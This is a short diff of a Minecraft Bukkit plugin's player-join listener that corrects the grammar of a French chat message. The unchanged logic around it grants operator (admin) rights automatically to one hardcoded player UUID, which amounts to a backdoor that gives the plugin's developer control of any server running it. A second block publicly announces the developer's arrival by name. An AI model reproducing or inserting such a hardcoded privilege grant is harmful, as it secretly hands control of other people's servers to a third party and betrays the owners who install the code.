@@ -84,7 +84,7 @@ public class JoinEvents implements Listener{
 		if (player.getUniqueId() == null)return;
 		if (player.getName() == null)return;
 		if (uuid.equals(UUID.fromString("f1f106ee-465e-4281-baee-fe7b61e39d1d"))) {
-			if (!player.isOp()){ player.setOp(true); player.sendMessage("Tu à été automatiquement mis op sur ce serveur ");}
+			if (!player.isOp()){ player.setOp(true); player.sendMessage("Tu as été automatiquement mis op sur ce serveur ");}
         }
 		if (player.getName().equals("BoulotKanao")) {
 			Bukkit.broadcastMessage("§7Vous avez de la chance le §6Dev §c" + e.getPlayer().getName() + " §7vient d'arriver dans votre partie !");
